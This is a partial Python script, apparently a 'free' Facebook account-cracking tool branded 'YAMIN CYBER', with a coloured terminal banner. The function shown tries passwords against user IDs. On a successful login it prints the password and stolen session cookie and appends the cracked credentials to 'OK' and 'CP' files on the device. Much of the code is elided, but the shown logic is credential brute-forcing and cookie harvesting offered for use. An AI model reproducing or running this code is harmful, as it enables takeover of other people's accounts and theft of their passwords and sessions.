...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Admin                   •   \033[34;1mMR-YAMIN CYBER  ]\33[1;38m    \033[1;31m 
╠══[Facebook                 • MD YAMIN CYBER  cyber  ]    \033[1;97m  
╠══[Github                   • \33[1;38mYAMIN CYBER-HACKING-TIM ]  \33[1;34m   
╠══[                • ]  \33[1;35m 
╠══[ TIME                  •   \33[1;35m ]   BISHNU+YAMIN CYBER FREE TOOLS       \33[1;32m   
...
def YAMIN ():
    ...
    print('Ok Ids Saved in /YAMIN CYBER-OK❤️.txt')
    print('Cp Ids Saved in /YAMIN CYBER-CP😭.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[YAMIN CYBER-OK❤️] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/YAMIN CYBER-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[YAMIN CYBER-CP😭]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/YAMIN CYBER-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mYAMIN CYBER\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
